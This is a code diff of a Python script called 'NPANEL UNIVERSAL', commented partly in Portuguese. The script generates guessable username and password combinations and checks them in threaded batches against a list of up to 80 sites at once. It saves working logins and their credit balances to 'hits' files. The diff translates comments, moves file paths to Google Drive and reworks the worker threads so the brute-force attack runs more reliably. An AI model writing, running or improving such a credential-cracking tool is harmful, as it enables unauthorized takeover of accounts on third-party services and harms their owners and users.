@@ -11,20 +11,20 @@ from colorama import Fore, Style, init
 from faker import Faker
 import random
 
-# Inicializar colorama
+# Initialize colorama
 init()
 
-# Configurações globais
+# Global settings
 THREADS_PER_SITE = 10
 SIMULTANEOUS_SITES = 80
-BATCH_SIZE = 1000  # Logins por lote
+BATCH_SIZE = 1000  # Logins per batch
 
-# Configuração SSL
-requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384"
+# SSL Configuration
+requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384"
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 logging.captureWarnings(True)
 
-# Configurações do nome do programa
+# Program name settings
 NOME = 'NPANEL UNIVERSAL'
 if sys.platform.startswith('win'):
     import ctypes
@@ -56,7 +56,6 @@ class LoginGenerator:
             numero = random.randint(0, 99)
             usuario = f"{nome}{numero:02d}"
             
-            # Combinações com anos
             anos = [2022, 2023, 2024]
             for ano in anos:
                 usuario_ano = f"{nome}{ano}"
@@ -74,7 +73,6 @@ class LoginGenerator:
                             self.used_combinations.add(combo)
                             logins.append(combo)
 
-            # Combinações adicionais de senha
             senhas = [
                 f"{numero:02d}{nome.capitalize()}",
                 f"{nome.capitalize()}{numero:02d}",
@@ -131,7 +129,7 @@ class LoginChecker:
             return None
 
     def save_valid_login(self, nhost, user, password, credits):
-        base_path = "/home/novidades/npanel/_Paineis/hits"
+        base_path = "/content/drive/MyDrive/_Paineis/hits"
         os.makedirs(base_path, exist_ok=True)
 
         with open(f"{base_path}/Sr.Hell@{nhost}.txt", "a") as f:
@@ -178,17 +176,19 @@ class LoginChecker:
                 return True
         return False
 
-def worker(login_queue, nhost, checker):
-    while True:
-        try:
-            user, password = login_queue.get_nowait()
-            checker.check_login(nhost, user, password)
-        except queue.Empty:
-            break
-        except Exception as e:
-            print(f"{Fore.RED}Erro ao verificar login: {str(e)}")
-        finally:
-            login_queue.task_done()
+def worker(login_queue, nhost, checker, worker_done_event):
+    try:
+        while not worker_done_event.is_set():
+            try:
+                user, password = login_queue.get(timeout=1)
+                try:
+                    checker.check_login(nhost, user, password)
+                finally:
+                    login_queue.task_done()
+            except queue.Empty:
+                continue
+    except Exception as e:
+        print(f"{Fore.RED}Erro no worker: {str(e)}")
 
 def process_site(nhost, login_generator, checker):
     print(f"{Fore.CYAN}Iniciando verificação do site: {nhost}")
@@ -198,6 +198,7 @@ def process_site(nhost, login_generator, checker):
         while True:
             batch_count += 1
             login_queue = queue.Queue()
+            worker_done_event = threading.Event()
             
             print(f"{Fore.YELLOW}Gerando lote #{batch_count} de logins para {nhost}...")
             login_batch = login_generator.generate_login_batch(BATCH_SIZE)
@@ -211,16 +212,21 @@ def process_site(nhost, login_generator, checker):
 
             threads = []
             for _ in range(THREADS_PER_SITE):
-                t = threading.Thread(target=worker, args=(login_queue, nhost, checker))
+                t = threading.Thread(target=worker, args=(login_queue, nhost, checker, worker_done_event))
                 t.daemon = True
                 t.start()
                 threads.append(t)
 
+            # Wait for all tasks to be processed
+            login_queue.join()
+            
+            # Signal workers to stop and wait for them
+            worker_done_event.set()
             for t in threads:
                 t.join()
             
             print(f"{Fore.GREEN}Lote #{batch_count} concluído para {nhost}")
-            time.sleep(1)  # Pequena pausa entre lotes
+            time.sleep(1)
 
     except KeyboardInterrupt:
         print(f"{Fore.YELLOW}Interrupção detectada. Finalizando verificação de {nhost}")
@@ -237,7 +243,7 @@ def main():
     print(ascii_art)
 
     try:
-        with open("/home/novidades/npanel/_Paineis/site.txt", "r") as f:
+        with open("/content/drive/MyDrive/_Paineis/site.txt", "r") as f:
             sites = [site.strip() for site in f.readlines() if site.strip()]
     except FileNotFoundError:
         print(f"{Fore.RED}Arquivo site.txt não encontrado!")
@@ -255,20 +261,24 @@ def main():
     login_generator = LoginGenerator()
     checker = LoginChecker()
 
-    site_threads = []
-    for site in sites:
-        t = threading.Thread(target=process_site, args=(site, login_generator, checker))
-        t.daemon = True
-        t.start()
-        site_threads.append(t)
-        
-        if len(site_threads) >= SIMULTANEOUS_SITES:
-            for thread in site_threads:
-                thread.join()
-            site_threads = []
+    try:
+        site_threads = []
+        for site in sites:
+            while len([t for t in site_threads if t.is_alive()]) >= SIMULTANEOUS_SITES:
+                time.sleep(1)
+                site_threads = [t for t in site_threads if t.is_alive()]
+            
+            t = threading.Thread(target=process_site, args=(site, login_generator, checker))
+            t.daemon = True
+            t.start()
+            site_threads.append(t)
 
-    for thread in site_threads:
-        thread.join()
+        for thread in site_threads:
+            thread.join()
+
+    except KeyboardInterrupt:
+        print(f"{Fore.YELLOW}\nPrograma interrompido pelo usuário.")
+        sys.exit(0)
 
 if __name__ == "__main__":
     try:
